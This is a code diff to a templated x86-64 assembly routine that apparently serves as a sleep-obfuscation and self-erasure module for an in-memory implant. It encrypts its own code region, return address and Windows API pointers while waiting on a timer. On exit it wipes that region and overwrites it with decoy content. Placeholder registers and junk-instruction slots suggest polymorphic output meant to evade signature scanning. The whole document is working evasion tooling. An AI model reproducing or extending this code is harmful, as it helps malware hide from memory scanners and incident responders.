@@ -7,15 +7,16 @@
 // struct:
 //   ======== Sleep ========                               ======== Free ========
 //   [rbp + 0*8]  Method                                   [rbp + 0*8]  Method
-//   [rbp + 1*8]  VirtualProtect                           [rbp + 1*8]  VirtualFree
-//   [rbp + 2*8]  WaitForSingleObject                      [rbp + 2*8]  ExitThread
-//   [rbp + 3*8]  CriticalAddress                          [rbp + 3*8]  CriticalAddress
-//   [rbp + 4*8]  CriticalSize                             [rbp + 4*8]  CriticalSize
-//   [rbp + 5*8]  DecoyAddress                             [rbp + 5*8]  DecoyAddress
-//   [rbp + 6*8]  DecoySize                                [rbp + 6*8]  DecoySize
-//   [rbp + 7*8]  ShelterAddress
-//   [rbp + 8*8]  TimerHandle
-//   [rbp + 9*8]  CryptoKey
+//   [rbp + 1*8]  VirtualProtect                           [rbp + 1*8]  VirtualProtect
+//   [rbp + 2*8]  WaitForSingleObject                      [rbp + 2*8]  VirtualFree
+//   [rbp + 3*8]  Reserved                                 [rbp + 3*8]  ExitThread
+//   [rbp + 4*8]  CriticalAddress                          [rbp + 4*8]  CriticalAddress
+//   [rbp + 5*8]  CriticalSize                             [rbp + 5*8]  CriticalSize
+//   [rbp + 6*8]  DecoyAddress                             [rbp + 6*8]  DecoyAddress
+//   [rbp + 7*8]  DecoySize                                [rbp + 7*8]  DecoySize
+//   [rbp + 8*8]  ShelterAddress
+//   [rbp + 9*8]  TimerHandle
+//   [rbp +10*8]  CryptoKey
 
 // step:
 //   encrypt return address                                erase return address
@@ -52,7 +53,7 @@ method_sleep:
 
   // save fields to non-volatile registers
   mov {{.RegN.rbp}}, rcx                       {{iji}} // save structure pointer
-  mov {{.RegN.rbx}}, [{{.RegN.rbp}} + 9*8]     {{iji}} // save crypto key
+  mov {{.RegN.rbx}}, [{{.RegN.rbp}} + 10*8]    {{iji}} // save crypto key
 
   // prevent the fixed crypto key
   xor {{.RegN.rbx}}, {{.RegV.rax}}             {{iji}}
@@ -64,7 +65,7 @@ method_sleep:
 
   // destroy CryptoKey in the stack
   xor {{.RegV.rdx}}, {{.RegV.rdx}}             {{iji}}
-  mov [{{.RegN.rbp}} + 9*8], {{.RegV.rdx}}     {{iji}}
+  mov [{{.RegN.rbp}} + 10*8], {{.RegV.rdx}}    {{iji}}
 
   // encrypt return address
   mov {{.RegV.rcx}}, [rsp + 3*8]               {{iji}}
@@ -72,9 +73,9 @@ method_sleep:
   mov [rsp + 3*8], {{.RegV.rcx}}               {{iji}}
 
   // encrypt the critical memory to shelter
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // set shelter address
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set critical size
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 8*8]     {{iji}} // set shelter address
   call xor_buf                                 {{iji}}
 
   // encrypt address of WaitForSingleObject
@@ -94,7 +95,7 @@ method_sleep:
   xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // clear register
   dec {{.RegV.eax}}                            {{iji}} // calculate INFINITE (0xFFFFFFFF)
   mov edx, {{.RegV.eax}}                       {{iji}} // set INFINITE
-  mov rcx, [{{.RegN.rbp}} + 8*8]               {{iji}} // set handle of hTimer
+  mov rcx, [{{.RegN.rbp}} + 9*8]               {{iji}} // set handle of hTimer
   mov rax, [{{.RegN.rbp}} + 2*8]               {{iji}} // get address of WaitForSingleObject
 
   // save argument about WaitForSingleObject
@@ -104,7 +105,7 @@ method_sleep:
 
   // encrypt argument structure
   mov {{.RegV.rcx}}, {{.RegN.rbp}}             {{iji}} // set structure pointer
-  mov {{.RegV.rdx}}, 10*8                      {{iji}} // set the buffer size
+  mov {{.RegV.rdx}}, 11*8                      {{iji}} // set the buffer size
   mov {{.RegV.rax}}, {{.RegN.rbp}}             {{iji}} // padding dst address
   call xor_buf                                 {{iji}}
 
@@ -120,14 +121,14 @@ method_sleep:
 
   // decrypt argument structure
   mov {{.RegV.rcx}}, {{.RegN.rbp}}             {{iji}} // set structure pointer
-  mov {{.RegV.rdx}}, 10*8                      {{iji}} // set the buffer size
+  mov {{.RegV.rdx}}, 11*8                      {{iji}} // set the buffer size
   mov {{.RegV.rax}}, {{.RegN.rbp}}             {{iji}} // padding dst address
   call xor_buf                                 {{iji}}
 
   // recover the critical memory from shelter
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // set shelter address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set shelter size
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 8*8]     {{iji}} // set shelter address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set shelter size
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
   call xor_buf                                 {{iji}}
 
   // recover the page protect to old protect
@@ -149,12 +150,16 @@ method_free:
   // save structure pointer
   mov {{.RegN.rbp}}, rcx                       {{iji}}
 
+  // adjust the page protect to PAGE_READWRITE
+  mov r8, 0x04                                 {{iji}}
+  call protect                                 {{iji}}
+
   // erase critical memory and deploy decoy
   call decoy                                   {{iji}}
 
   // free critical memory
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 1*8]     {{iji}} // get address of VirtualFree
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // lpAddress
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 2*8]     {{iji}} // get address of VirtualFree
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // lpAddress
   xor {{.RegV.rdx}}, {{.RegV.rdx}}             {{iji}} // dwSize = 0
   mov {{.RegV.r8}}, 0x4000                     {{iji}} // dwFreeType = MEM_RELEASE
   sub rsp, 0x20                                {{iji}} // reserve stack for call convention
@@ -162,7 +167,7 @@ method_free:
   add rsp, 0x20                                {{iji}} // restore stack for call convention
 
   // exit current thread
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 2*8]     {{iji}} // get address of ExitThread
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // get address of ExitThread
   xor {{.RegV.rcx}}, {{.RegV.rcx}}             {{iji}} // dwExitCode = 0
   sub rsp, 0x20                                {{iji}} // reserve stack for call convention
   call {{.RegV.rax}}                           {{iji}} // call ExitThread
@@ -183,8 +188,8 @@ xor_buf:
 
 decoy:
   // erase critical memory
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set critical size
   shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
   xor {{.RegV.r9}}, {{.RegV.r9}}               {{iji}} // calculate zero value
  loop_erase:
@@ -194,9 +199,9 @@ decoy:
   jnz loop_erase                               {{iji}} // check need erase next
 
   // fill critical memory with decoy
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set decoy address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy size (loop count)
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // set decoy size (loop count)
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
   test {{.RegV.rdx}}, {{.RegV.rdx}}            {{iji}} // check decoy size is zero
   jz skip_decoy                                {{iji}} // check need skip fill
  loop_decoy:
@@ -221,8 +226,8 @@ protect:
   push {{.RegN.rdi}}                           {{iji}} // save non-volatile register
   mov {{.RegN.rdi}}, [{{.RegN.rbp}} + 1*8]     {{iji}} // get address of VirtualProtect
   xor [{{.RegN.rbp}} + 1*8], {{.RegN.rbx}}     {{iji}} // encrypt address of VirtualProtect
-  mov rcx, [{{.RegN.rbp}} + 3*8]               {{iji}} // set address of critical
-  mov rdx, [{{.RegN.rbp}} + 4*8]               {{iji}} // set size of critical
+  mov rcx, [{{.RegN.rbp}} + 4*8]               {{iji}} // set address of critical
+  mov rdx, [{{.RegN.rbp}} + 5*8]               {{iji}} // set size of critical
   sub rsp, 0x08                                {{iji}} // for save old protect
   mov r9,  rsp                                 {{iji}} // lpflOldProtect
   sub rsp, 0x28                                {{iji}} // reserve stack for call convention
